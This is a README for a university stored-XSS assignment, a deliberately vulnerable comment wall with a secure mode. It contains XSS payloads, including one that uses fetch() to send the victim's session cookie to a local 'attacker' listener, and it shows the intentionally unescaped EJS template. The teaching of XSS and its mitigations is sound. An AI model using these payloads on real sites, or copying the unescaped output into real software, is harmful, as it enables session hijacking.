# Stored XSS Demo — Campus Comment Wall

IT-30001 Cyber Security, Autumn 2026 — Assignment: Web Server Security
Vulnerability category: **Cross-Site Scripting (XSS)** — Variant: **Stored XSS**

## Setup

```bash
npm install
npm start
```

Visit `http://localhost:3000`.

Open a second terminal for the cookie-theft demo:

```bash
node attacker/listener.js
```

This listens on `http://localhost:4000/steal`.

## How the demo works

- Use the navbar links to switch between **Vulnerable mode** (`?mode=vulnerable`)
  and **Secure mode** (`?mode=secure`). The mode is remembered in a cookie.
- Post a comment as "Alice" in vulnerable mode with a script payload.
- Open a **second browser tab or incognito window** as "the victim" — reload
  the wall and watch the payload execute for them too, proving it's *stored*
  (persists across requests/users), not just reflected back to the poster.

## Payloads to demonstrate

1. **Proof of execution (alert box):**
   ```html
   <img src=x onerror=alert('Stored XSS by <your name>')>
   ```
   (`<script>` tags are blocked by some browsers when injected via
   `innerHTML`-style rendering — the `onerror` trick is the standard
   workaround and still shows the same flaw.)

2. **Reading the session cookie:**
   ```html
   <img src=x onerror=alert(document.cookie)>
   ```

3. **Exfiltrating the cookie to an attacker server (run listener.js first):**
   ```html
   <img src=x onerror="fetch('http://localhost:4000/steal?c='+document.cookie)">
   ```
   Watch the attacker terminal print the stolen cookie when the "victim" tab
   loads the wall.

## Where the vulnerability is (`views/wall.ejs`)

```ejs
<% if (mode === "vulnerable") { %>
  <%- c.text %>   <!-- VULNERABLE: raw, unescaped output -->
<% } else { %>
  <%= c.text %>   <!-- SECURE: EJS auto-escapes HTML entities -->
<% } %>
```

- `<%- %>` in EJS prints the raw string — exactly what makes this vulnerable.
- `<%= %>` HTML-entity-encodes the string before printing — this is the
  mitigation actually implemented for this assignment (context-aware output
  encoding / framework auto-escaping).

The session cookie's `HttpOnly` flag is also toggled by mode
(`server.js`) purely to make the "impact" demo (cookie theft) visible in
vulnerable mode and blocked in secure mode — this doubles as a second,
*optional* mitigation you can mention (not the required one).

## Root cause

User-supplied comment text is stored as-is and later inserted into the page's
HTML without encoding. The browser cannot distinguish "data the user typed"
from "markup/script to execute," so injected `<img onerror=...>`/`<script>`
content runs with the page's own privileges (reads cookies, can make
requests, etc.).

## Mitigation implemented

**Context-aware output encoding** (EJS `<%= %>` auto-escaping): HTML special
characters (`<`, `>`, `&`, `"`, `'`) in user input are converted to entities
before being inserted into the page, so injected tags render as inert text
instead of being parsed as markup. Same payload, same storage — now it just
displays as literal text (see screenshot in `/screenshots`).

## Other mitigations (theory only, not implemented)

- **Framework auto-escaping** by default across the whole app (many modern
  frameworks like React/Vue escape by default unless you explicitly opt out
  with something like `dangerouslySetInnerHTML`) — removes the chance of a
  developer forgetting to encode.
- **Sanitiser for rich HTML** (e.g. DOMPurify) when some HTML formatting
  *should* be allowed (bold, links) — strips dangerous tags/attributes
  (`<script>`, `onerror=`, `javascript:` URLs) while keeping safe markup.
- **Content Security Policy (CSP)** — an HTTP header restricting which
  script sources the browser will execute (e.g. `script-src 'self'`),
  so even a successfully injected inline script won't run.
- **HttpOnly cookies** — marks the session cookie unreadable by JavaScript,
  so even if a script injection succeeds, `document.cookie` returns nothing
  useful, limiting the impact of the XSS.
- **Safe DOM sinks** — using `textContent`/`innerText` instead of
  `innerHTML` when inserting user data via client-side JS, since
  `textContent` never parses its argument as HTML.

## Ownership (Table 3)

| Member name | Roll number | Category | Variant implemented |
|---|---|---|---|
| _<your name>_ | _<roll no>_ | Cross-Site Scripting (XSS) | Stored XSS |

## Authorised testing note

This application and the attacker listener run only on `localhost` and are
used only against this group's own instance, per the assignment's
authorised-testing requirement.
